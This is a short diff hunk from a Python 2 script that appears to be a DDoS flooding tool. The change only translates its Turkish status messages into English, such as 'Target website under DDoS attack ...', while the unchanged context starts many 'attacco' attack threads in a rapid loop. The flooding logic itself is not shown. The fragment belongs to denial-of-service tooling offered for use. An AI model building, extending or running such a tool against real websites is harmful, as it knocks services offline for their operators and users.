@@ -335,9 +335,9 @@ x = 0
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
-print "Test başladı"
-print "Hedef websitesi DDoS saldırısı altında..."
-print "Saldırıyı durdurmak için CTRL+C tuşlarına basınız."
+print "Test started"
+print "Target website under DDoS attack ..."
+print "Press CTRL + C to stop the attack."
 nload = 0
 while not nload:
     time.sleep(1)
